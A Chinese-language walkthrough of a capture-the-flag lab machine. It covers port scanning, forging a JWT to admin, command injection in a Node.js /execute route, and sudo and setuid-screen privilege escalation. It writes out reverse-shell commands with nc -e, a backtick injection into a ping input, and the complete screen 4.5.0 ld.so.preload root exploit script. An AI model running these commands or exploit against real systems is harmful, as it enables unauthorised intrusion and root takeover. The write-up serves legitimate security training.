# 信息搜集

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.21.9
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-14 05:03 EDT
Nmap scan report for 192.168.21.9
Host is up (0.00031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db:f9:46:e5:20:81:6c:ee:c7:25:08:ab:22:51:36:6c (RSA)
|   256 33:c0:95:64:29:47:23:dd:86:4e:e6:b8:07:33:67:ad (ECDSA)
|_  256 be:aa:6d:42:43:dd:7d:d4:0e:0d:74:78:c1:89:a1:36 (ED25519)
3000/tcp open  http    Node.js Express framework
|_http-title: Error
MAC Address: 08:00:27:CD:D0:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.31 ms 192.168.21.9

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.70 seconds
```

# 漏洞利用

看一下3000端口

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.9:3000/
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /</pre>
</body>
</html>
```

用post方式目录扫描一下

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,php,txt,jpg,png,zip,git -m POST -u http://192.168.21.9:3000/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.9:3000/
[+] Method:                  POST
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,jpg,png,zip,git,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 401) [Size: 22]
/register             (Status: 400) [Size: 29]
/execute              (Status: 401) [Size: 12]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

看一下都是什么

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.9:3000/login -X POST
Identifiants invalides                                                                     
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.9:3000/register -X POST
The "role" field is not valid                                                                     
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.9:3000/execute -X POST 
Unauthorized
```

爆破一下role字段

```
┌──(kali㉿kali)-[~]
└─$ wfuzz -c -u "http://192.168.21.9:3000/register" -X POST -H "Content-Type: application/json" -d "{\"role\":\"FUZZ\"}" -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt --hc 404 --hw 6 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 /usr/lib/python3/dist-packages/wfuzz/helpers/file_func.py:4: UserWarning:pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.21.9:3000/register
Total requests: 1185254

=====================================================================
ID           Response   Lines    Word       Chars       Payl
                                                        oad 
=====================================================================

000000125:   500        0 L      5 W        32 Ch       "use
                                                        r"
```

尝试注册

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.9:3000/register -X POST -H "Content-Type: application/json" -d "{\"role\":\"user\"}" 
Column 'username' cannot be null                                                                     
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.9:3000/register -X POST -H "Content-Type: application/json" -d "{\"role\":\"user\",\"username\":\"xxxx\"}" 
Column 'password' cannot be null                                                                     
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.9:3000/register -X POST -H "Content-Type: application/json" -d "{\"role\":\"user\",\"username\":\"xxxx\",\"password\":\"xxxx\"}" 
Registration OK
```

进行登录

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.9:3000/login -X POST -H "Content-Type: application/json" -d "{\"role\":\"user\",\"username\":\"xxxx\",\"password\":\"xxxx\"}" 
{"accessToken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Inh4eHgiLCJyb2xlIjoidXNlciIsImlhdCI6MTc1Nzg0ODc4OH0.mVmQD7PuxRhTOxZRpk_rn5bDF2LmhLAeQd3FTg60HUs"}
```

解密以后得到

```
{
    "username": "xxxx",
    "role": "user",
    "iat": 1757848788
}
```

修改为admin，尝试一下execute

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.9:3000/execute -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>TypeError [ERR_INVALID_ARG_TYPE]: The &quot;file&quot; argument must be of type string. Received undefined<br> &nbsp; &nbsp;at validateString (internal/validators.js:120:11)<br> &nbsp; &nbsp;at normalizeSpawnArguments (child_process.js:411:3)<br> &nbsp; &nbsp;at spawn (child_process.js:547:16)<br> &nbsp; &nbsp;at Object.execFile (child_process.js:237:17)<br> &nbsp; &nbsp;at exec (child_process.js:158:25)<br> &nbsp; &nbsp;at /opt/login-app/app.js:69:3<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/opt/login-app/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/opt/login-app/node_modules/express/lib/router/route.js:144:13)<br> &nbsp; &nbsp;at /opt/login-app/app.js:112:5<br> &nbsp; &nbsp;at /opt/login-app/node_modules/jsonwebtoken/verify.js:261:12</pre>
</body>
</html>
```

/execute路由直接/间接使用来自请求的数据作为execFile/exec参数，尝试模糊测试

```
┌──(kali㉿kali)-[~]
└─$ wfuzz -c -u "http://192.168.21.9:3000/execute" -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk" -d "{\"FUZZ\":\"id\"}" -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt --hc 404 --hw 65,63
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 /usr/lib/python3/dist-packages/wfuzz/helpers/file_func.py:4: UserWarning:pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.21.9:3000/execute
Total requests: 1185254

=====================================================================
ID           Response   Lines    Word       Chars       Payl
                                                        oad 
=====================================================================

000013431:   200        1 L      3 W        54 Ch       "com
                                                        mand
                                                        "
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.9:3000/execute -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk" -d '{"command":"id"}' 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

反弹一个shell

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.9:3000/execute -X POST -H "Content-Type: application/json" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzM3NTk5MzQ4fQ.L5acgyrWbMNdNDkCc5Li6oN-he1DS1Q8EyykWeLvsuk" -d '{"command":"nc 192.168.21.10 1234 -e /bin/bash"}'
```

# 权限提升

看一下哪里可能可以提权

```
www-data@aurora:~$ sudo -l
sudo -l
Matching Defaults entries for www-data on aurora:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on aurora:
    (doro) NOPASSWD: /usr/bin/python3 /home/doro/tools.py *
```

提权

```
www-data@aurora:~$ cat /home/doro/tools.py
cat /home/doro/tools.py
import os
import sys

def main():
    if len(sys.argv) < 2:
        print_help()
        return
    
    option = sys.argv[1]
    if option == "--ping":
        ping()
    elif option == "--traceroute":
        traceroute_ip()
    else:
        print("Invalid option.")
        print_help()

def print_help():
    print("Usage: python3 network_tool.py <option>")
    print("Options:")
    print("--ping           Ping an IP address")
    print("--traceroute     Perform a traceroute on an IP address")

def ping():
    ip_address = input("Enter an IP address: ")

    forbidden_chars = ["&", ";", "(", ")", "||", "|", ">", "<", "*", "?"]
    for char in forbidden_chars:
        if char in ip_address:
            print("Forbidden character found: {}".format(char))
            sys.exit(1)
    
    os.system('ping -c 2 ' + ip_address)

def traceroute_ip():
    ip_address = input("Enter an IP address: ")

    if not is_valid_ip(ip_address):
        print("Invalid IP address.")
        return
    
    traceroute_command = "traceroute {}".format(ip_address)
    os.system(traceroute_command)

def is_valid_ip(ip_address):
    octets = ip_address.split(".")
    if len(octets) != 4:
        return False
    for octet in octets:
        if not octet.isdigit() or int(octet) < 0 or int(octet) > 255:
            return False
    return True

if __name__ == "__main__":
    main()
www-data@aurora:~$ sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping
sudo -u doro /usr/bin/python3 /home/doro/tools.py --ping
Enter an IP address: `nc -e /bin/bash 192.168.21.10 4444`
```

看一下哪里可能提权

```
doro@aurora:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/screen
/usr/bin/sudo
/usr/bin/umount
```

<img width="1686" height="473" alt="图片" src="https://github.com/user-attachments/assets/d7f82519-c22c-40a7-914a-e3f3bd8e0d46" />

提权

```
┌──(kali㉿kali)-[~]
└─$ cat 41154.sh      
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
doro@aurora:/tmp$ ./41154.sh
./41154.sh
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function ‘dropshell’:
/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
    7 |     chmod("/tmp/rootshell", 04755);
      |     ^~~~~
/usr/bin/ld: cannot open output file /tmp/libhax.so: Permission denied
collect2: error: ld returned 1 exit status
/tmp/rootshell.c: In function ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    3 |     setuid(0);
      |     ^~~~~~
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    4 |     setgid(0);
      |     ^~~~~~
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
    5 |     seteuid(0);
      |     ^~~~~~~
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
    6 |     setegid(0);
      |     ^~~~~~~
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
    7 |     execvp("/bin/sh", NULL, NULL);
      |     ^~~~~~
/tmp/rootshell.c:7:5: warning: too many arguments to built-in function ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]
/usr/bin/ld: cannot open output file /tmp/rootshell: Permission denied
collect2: error: ld returned 1 exit status
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-doro.

# id
id
uid=0(root) gid=0(root) groups=0(root),1000(doro)
```
